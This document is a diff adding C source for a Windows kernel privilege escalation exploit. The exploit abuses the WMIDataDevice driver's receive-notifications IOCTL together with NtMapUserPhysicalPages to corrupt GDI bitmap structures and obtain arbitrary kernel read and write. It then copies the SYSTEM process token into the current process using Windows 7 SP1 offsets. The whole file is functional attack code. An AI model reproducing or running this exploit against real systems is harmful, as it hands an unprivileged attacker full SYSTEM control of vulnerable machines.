@@ -1,0 +1,316 @@
+#include <windows.h>
+#include <Psapi.h>
+#include <process.h>
+#include <stdio.h>
+
+#include "Library.h"
+
+PPEB GetCurrentPeb(VOID) {
+
+	NTSTATUS (*ZwQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
+	PROCESS_BASIC_INFORMATION ProcessInformation;
+	ULONG ReturnLength;
+	HMODULE library;
+
+	library = LoadLibrary("ntdll.dll");
+
+	if (library == NULL) { return NULL; }
+
+	ZwQueryInformationProcess = (VOID *)GetProcAddress(library, "ZwQueryInformationProcess");
+
+	if (ZwQueryInformationProcess == NULL) { return NULL; }
+
+	if (ZwQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &ReturnLength) != 0) {
+		return NULL;
+	}
+
+	return ProcessInformation.PebBaseAddress;
+}
+
+BOOLEAN SetupBitmapManagerAndWorker(HBITMAP *hManager, HBITMAP *hWorker) {
+	
+	BYTE bitmap[BITMAP_SIZE];
+	HBITMAP bitmaps[BITMAP_COUNT];
+	INT i;
+
+	memset(bitmap, 'a', BITMAP_SIZE);
+
+	for (i = 0; i < BITMAP_COUNT; i++) {
+		bitmaps[i] = CreateBitmap(BITMAP_WIDTH, BITMAP_HEIGHT, BITMAP_PLANES, BITMAP_BIT_COUNT, &bitmap);
+
+		if (bitmaps[i] == NULL) {
+			printf("[-] Unable To Create The Required Bitmaps\n");
+			return FALSE;
+		}
+
+		GetBitmapBits(bitmaps[i], BITMAP_SIZE, &bitmap);
+	}
+
+	*hManager = bitmaps[BITMAP_MANAGER_INDEX];
+	*hWorker = bitmaps[BITMAP_WORKER_INDEX];
+
+	return TRUE;
+}
+
+PVOID GetBitmapKernelAddress(PPEB peb, HBITMAP handle) {
+	
+	GDICELL64 *cells;
+	WORD index;
+	
+	index = LOWORD(handle);
+
+	cells = (GDICELL64 *)(peb->GdiSharedHandleTable);
+
+	return cells[index].pKernelAddress;
+}
+
+BOOLEAN WriteMemory(HBITMAP hManager, HBITMAP hWorker, PVOID dest, PVOID src, DWORD len) {
+		
+	if (SetBitmapBits(hManager, sizeof(PVOID), &dest) == 0) {
+		printf("[-] Unable To Set Destination Address: 0x%p\n", dest);
+		return FALSE;
+	}
+
+	return SetBitmapBits(hWorker, len, src) ? TRUE : FALSE;
+}
+
+LONG ReadMemory(HBITMAP hManager, HBITMAP hWorker, PVOID src, PVOID dest, DWORD len) {
+	
+	if (SetBitmapBits(hManager, sizeof(PVOID), &src) == 0) {
+		printf("[-] Unable To Set Source Address: 0x%p\n", src);
+		return FALSE;
+	}
+	
+	return GetBitmapBits(hWorker, len, dest) ? TRUE : FALSE;
+}
+
+PVOID GetNtOsKrnl(VOID) {
+	PVOID ImageBases[IMAGE_BASE_LIST_SIZE];
+	DWORD needed = 0;
+
+	if (EnumDeviceDrivers((LPVOID *)&ImageBases, sizeof(ImageBases), &needed) == 0) {
+		printf("[-] Unable To Enumerate Device Drivers: %d\n", needed);
+		return NULL;
+	}
+
+	return ImageBases[IMAGE_BASE_KERNEL_INDEX];
+}
+
+PVOID GetPsInitialSystemProcess(HBITMAP hManager, HBITMAP hWorker) {
+
+	HMODULE loaded;
+	PVOID address;
+	PVOID runtime;
+
+	loaded = LoadLibrary("ntoskrnl.exe");
+
+	if (loaded == NULL) {
+		printf("[-] Unable To Load NtOsKrnl.exe\n");
+		return NULL;
+	}
+
+	address = GetProcAddress(loaded, "PsInitialSystemProcess");
+
+	if (address == NULL) {
+		printf("[-] Unable To Get PsInitialSystemProcess\n");
+		return NULL;
+	}
+
+	FreeLibrary(loaded);
+
+	runtime = GetNtOsKrnl();
+
+	if (runtime == NULL) {
+		printf("[+] Unable To Get NtOsKrnl Runtime Address\n");
+		return NULL;
+	}
+
+	if (ReadMemory(hManager, hWorker, (PVOID)((ULONG64)address - (ULONG64)loaded + (ULONG64)runtime), &address, sizeof(PVOID)) == FALSE) {
+		printf("[-] Unable To Read PsInitialSystemProcess Address\n");
+		return NULL;
+	}
+
+	return address;
+}
+
+PVOID GetPsGetCurrentProcess(HBITMAP hManager, HBITMAP hWorker, PEPROCESS_OFFSETS offsets) {
+
+	PVOID systemProcess;
+	LIST_ENTRY ActiveProcessLinks;
+	ULONG64 UniqueProcessId;
+	PVOID currentProcess;
+
+	systemProcess = GetPsInitialSystemProcess(hManager, hWorker);
+
+	if (ReadMemory(hManager, hWorker, (PVOID)((ULONG64)systemProcess + offsets->UniqueProcessId + sizeof(ULONG64)), &ActiveProcessLinks, sizeof(LIST_ENTRY)) == FALSE) {
+		printf("[-] Unable To Read Initial System Process ActiveProcessLinks\n");
+		return NULL;
+	}
+
+	do {
+		currentProcess = (PVOID)((ULONG64)ActiveProcessLinks.Flink - offsets->UniqueProcessId - sizeof(ULONG64));
+
+		ReadMemory(hManager, hWorker, (PVOID)((ULONG64)currentProcess + offsets->UniqueProcessId), &UniqueProcessId, sizeof(ULONG64));
+
+		if (GetCurrentProcessId() == UniqueProcessId) { return currentProcess; }
+
+		ReadMemory(hManager, hWorker, (PVOID)((ULONG64)currentProcess + offsets->UniqueProcessId + sizeof(ULONG64)), &ActiveProcessLinks, sizeof(LIST_ENTRY));
+
+	} while (currentProcess != (PVOID)((ULONG64)ActiveProcessLinks.Flink - offsets->UniqueProcessId - sizeof(ULONG64)));
+
+	printf("[-] Unable To Locate The Current Process In The List\n");
+
+	return NULL;
+}
+
+BOOLEAN TriggerVulnerability(PPEB pPeb, HBITMAP *hManager, HBITMAP *hWorker) {
+
+	PVOID pageFrameNumbers[PAGE_FRAME_NUMBER_COUNT];
+	WMI_RECEIVE_NOTIFICATION notification;
+	PVOID hManagerAddress, hWorkerAddress;
+	BYTE ReturnBuffer[RETURN_BUFFER_SIZE];
+	DWORD ReturnSize;
+	HANDLE hDriver;
+	PVOID address;
+	INT i;
+
+	NTSTATUS NtMapUserPhysicalPages(PVOID BaseAddress, ULONG NumberOfPages, PVOID *PageFrameNumbers);
+
+
+	if (SetupBitmapManagerAndWorker(hManager, hWorker) == FALSE) {
+		printf("[-] Unable To Setup Manager And Worker Bitmaps\n");
+		return FALSE;
+	}
+
+	hManagerAddress = GetBitmapKernelAddress(pPeb, *hManager);
+	hWorkerAddress = GetBitmapKernelAddress(pPeb, *hWorker);
+
+	printf("[%%] Targeting pvScan0 With \"mov rdx, [rdx+0x8]\" Instruction\n");
+
+	for (i = 0; i < (sizeof(notification) / sizeof(PVOID)); i++) { ((ULONG64 *)&notification)[i] = BITMAP_STRUCTURE_CORRUPTION_VALUE_0; }
+
+	notification.HandleCount = 0;
+	notification.Action = WMI_RECEIVE_NOTIFICATION_ACTION_CREATE_THREAD;
+	notification.UserModeProcess = GetCurrentProcess();
+
+	for (i = 0; i < (sizeof(pageFrameNumbers) / sizeof(PVOID)); i++) { pageFrameNumbers[i] = hManagerAddress; }
+
+	printf("[%%] pPeb: 0x%p\n", pPeb);
+	printf("[%%] hManager: 0x%p, hWorker: 0x%p\n", *hManager, *hWorker);
+	printf("[%%] hManagerAddress: 0x%p, hWorkerAddress: 0x%p\n", hManagerAddress, hWorkerAddress);
+
+	hDriver = CreateFileA("\\\\.\\WMIDataDevice", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[-] Unable To Open The WMIDataDevice\n");
+		return FALSE;
+	}
+
+    i = 0;
+	do {
+		Sleep(0);
+
+		NtMapUserPhysicalPages(pageFrameNumbers, (sizeof(pageFrameNumbers) / sizeof(PVOID)), pageFrameNumbers);
+
+		if (DeviceIoControl(hDriver, WMI_RECEIVE_NOTIFICATIONS_IOCTL, &notification, sizeof(notification), &ReturnBuffer, sizeof(ReturnBuffer), &ReturnSize, NULL) == FALSE) {
+			printf("[-] Device IO Control Returned Failure\n");
+			return FALSE;
+		}
+
+		GetBitmapBits(*hManager, sizeof(PVOID), &address);
+	} while ((address != (PVOID)((ULONG64)hManagerAddress + BITMAP_STRUCTURE_CHECK_OFFSET)) && (++i < TRIGGER_VULNERABILITY_RETRIES));
+
+
+    if((address != (PVOID)((ULONG64)hManagerAddress + BITMAP_STRUCTURE_CHECK_OFFSET)) && (i == TRIGGER_VULNERABILITY_RETRIES)) {
+        printf("[-] Unable To Trigger The Vulnerability\n");
+        return FALSE;
+    }
+
+	printf("[+] Self-Referencing Pointer Placement Complete\n");
+
+	pageFrameNumbers[0] = (PVOID)((ULONG64)hManagerAddress + BITMAP_STRUCTURE_CORRUPTION_VALUE_1);
+	pageFrameNumbers[1] = (PVOID)((ULONG64)hWorkerAddress + BITMAP_STRUCTURE_PVSCAN0_OFFSET);
+	SetBitmapBits(*hManager, (sizeof(PVOID) * 2), pageFrameNumbers);
+
+	printf("[+] Stage 1 Cleanup Complete\n");
+	printf("[+] Pointed hManager's pvScan0 To hWorker's pvScan0\n");
+
+	pageFrameNumbers[0] = NULL;
+	WriteMemory(*hManager, *hWorker, (PVOID)((ULONG64)hManagerAddress + BITMAP_STRUCTURE_CORRUPTION_OFFSET), pageFrameNumbers, sizeof(PVOID));
+
+	printf("[+] Stage 2 Cleanup Complete\n");
+
+	return TRUE;
+}
+
+BOOLEAN TriggerPrivilegeEscalation(HBITMAP hManager, HBITMAP hWorker, PEPROCESS_OFFSETS offsets) {
+
+	PVOID systemProcess;
+	PVOID currentProcess;
+	PVOID systemToken;
+
+	systemProcess = GetPsInitialSystemProcess(hManager, hWorker);
+
+	if (systemProcess == NULL) {
+		printf("[-] Unable To Get The System Process\n");
+		return FALSE;
+	}
+
+	currentProcess = GetPsGetCurrentProcess(hManager, hWorker, offsets);
+
+	if (currentProcess == NULL) {
+		printf("[-] Unable To Get The Current Process\n");
+		return FALSE;
+	}
+
+	printf("[%%] SystemProcess: 0x%p, CurrentProcess: 0x%p\n", systemProcess, currentProcess);
+
+	if (ReadMemory(hManager, hWorker, (PVOID)((ULONG64)systemProcess + offsets->Token), &systemToken, sizeof(PVOID)) == FALSE) {
+		printf("[-] Unable To Get The System Process Token\n");
+		return FALSE;
+	}
+
+	printf("[%%] SystemToken: 0x%p\n", systemToken);
+
+	if (WriteMemory(hManager, hWorker, (PVOID)((ULONG64)currentProcess + offsets->Token), &systemToken, sizeof(PVOID)) == FALSE) {
+		printf("[-] Unable To Set The Current Process Token\n");
+		return FALSE;
+	}
+
+	printf("[+] System Process Token Stolen\n");
+
+	return TRUE;
+}
+
+BOOLEAN TriggerExploit(VOID) {
+
+	PPEB pPeb;
+	HBITMAP hManager, hWorker;
+	EPROCESS_OFFSETS win7SP1Offsets = { 0x180, 0x208 };
+
+	printf("\n");
+
+	pPeb = GetCurrentPeb();
+
+	if (pPeb == NULL) {
+		printf("[-] Unable To Get The Current PEB\n");
+		return FALSE;
+	}
+
+	if (TriggerVulnerability(pPeb, &hManager, &hWorker) == FALSE) {
+		printf("[-] Unable To Trigger Vulnerability\n");
+		return FALSE;
+	}
+
+	printf("[+] Vulnerability Triggered\n");
+
+	printf("[+] Bitmap Read/Write Primitives Now Available\n");
+
+	if (TriggerPrivilegeEscalation(hManager, hWorker, &win7SP1Offsets) == FALSE) {
+		printf("[-] Unable To Trigger Exploit\n");
+		return FALSE;
+	}
+
+	printf("[+] Privilege Escalation Triggered\n\n");
+
+	return TRUE;
+}
